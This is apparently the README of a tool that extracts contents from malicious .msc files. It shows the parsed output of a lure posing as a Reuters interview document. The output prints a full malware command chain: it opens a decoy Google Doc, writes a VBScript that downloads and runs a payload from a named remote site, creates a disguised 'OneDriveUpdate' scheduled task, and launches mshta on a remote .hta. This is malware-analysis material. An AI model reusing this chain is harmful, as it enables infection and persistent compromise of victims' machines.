# msc_dark_all_day
https://www.youtube.com/watch?v=ZLVwPZOW4iA
```
python3 ./msc_dark_all_day.py --input='/home/coz/Downloads/Interview by Reuters(SeanKing).msc' --output=/tmp/dump9
Commands, strings, images, files, json, all the MSC things have been saved to: /tmp/dump9
coz@genesis:~/Downloads/msc_dark_all_day$ cat /tmp/dump8/msc_dark_all_day.json 
{
    "commands": [
        {
            "name": "Open",
            "description": "Interview by Reuters(SeanKing).docx",
            "command": "cmd.exe",
            "params": "/c mode 15,1&start explorer \"https://docs.google.com/document/d/1R3zhXXsPPWg3an0aV1SqdjlSC1dM17L2/edit?usp=sharing&ouid=110632654410291203272&rtpof=true&sd=true\"&echo On Error Resume Next:Set ws = CreateObject(\"WScript.Shell\"):Set fs = CreateObject(\"Scripting.FileSystemObject\"):Set Post0 = CreateObject(\"msxml2.xmlhttp\"):gpath = ws.ExpandEnvironmentStrings(\"%appdata%\") + \"\\Microsoft\\sus.gif\":bpath = ws.ExpandEnvironmentStrings(\"%appdata%\") + \"\\Microsoft\\sus.bat\":If fs.FileExists(gpath) Then:re=fs.movefile(gpath,bpath):re=ws.run(bpath,0,true):fs.deletefile(bpath):Else:Post0.open \"GET\", \"https://orientedworld.com/wp-content/plugins/health-check/pages/gorgon1/d.php?na=battmp\",False: Post0.setRequestHeader \"Content-Type\", \"application/x-www-form-urlencoded\":Post0.Send:t0=Post0.responseText:Set f = fs.CreateTextFile(gpath,True):f.Write(t0):f.Close:End If:>\"C:\\Users\\Public\\Pictures\\temp.vbs\"&schtasks /create /tn OneDriveUpdate /tr \"wscript.exe /b \"C:\\Users\\Public\\Pictures\\temp.vbs\"\" /sc minute /mo 41 /f&start /min mshta https://orientedworld.com/wp-content/plugins/health-check/pages/gorgon1/ttt.hta",
            "full_command": "cmd.exe /c mode 15,1&start explorer \"https://docs.google.com/document/d/1R3zhXXsPPWg3an0aV1SqdjlSC1dM17L2/edit?usp=sharing&ouid=110632654410291203272&rtpof=true&sd=true\"&echo On Error Resume Next:Set ws = CreateObject(\"WScript.Shell\"):Set fs = CreateObject(\"Scripting.FileSystemObject\"):Set Post0 = CreateObject(\"msxml2.xmlhttp\"):gpath = ws.ExpandEnvironmentStrings(\"%appdata%\") + \"\\Microsoft\\sus.gif\":bpath = ws.ExpandEnvironmentStrings(\"%appdata%\") + \"\\Microsoft\\sus.bat\":If fs.FileExists(gpath) Then:re=fs.movefile(gpath,bpath):re=ws.run(bpath,0,true):fs.deletefile(bpath):Else:Post0.open \"GET\", \"https://orientedworld.com/wp-content/plugins/health-check/pages/gorgon1/d.php?na=battmp\",False: Post0.setRequestHeader \"Content-Type\", \"application/x-www-form-urlencoded\":Post0.Send:t0=Post0.responseText:Set f = fs.CreateTextFile(gpath,True):f.Write(t0):f.Close:End If:>\"C:\\Users\\Public\\Pictures\\temp.vbs\"&schtasks /create /tn OneDriveUpdate /tr \"wscript.exe /b \"C:\\Users\\Public\\Pictures\\temp.vbs\"\" /sc minute /mo 41 /f&start /min mshta https://orientedworld.com/wp-content/plugins/health-check/pages/gorgon1/ttt.hta",
            "images": [
                {
                    "image_ref_id": 6,
                    "image_filename": "/tmp/dump8/image_6"
                },
                {
                    "image_ref_id": 7,
                    "image_filename": "/tmp/dump8/image_7"
                }
            ]
        }
    ],
    "strings": {
        "10": "Interview by Reuters(SeanKing)",
        "1": "Favorites",
        "3": "Console Root",
        "4": "Security Mode",
        "null": "",
        "5": "Open",
        "11": "Interview by Reuters(SeanKing).docx"
    },
    "urls": [],
    "other_binaries": [
        "/tmp/dump8/other_image_3",
        "/tmp/dump8/other_image_4",
        "/tmp/dump8/other_binary_5.bin"
    ],
    "visual_icons": [
        {
            "icon_index": "0",
            "icon_file": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "images": [
                {
                    "image_ref_id": 0,
                    "image_filename": "/tmp/dump8/image_0"
                },
                {
                    "image_ref_id": 1,
                    "image_filename": "/tmp/dump8/image_1"
                },
                {
                    "image_ref_id": 2,
                    "image_filename": "/tmp/dump8/image_2"
                }
            ]
        }
    ]
}
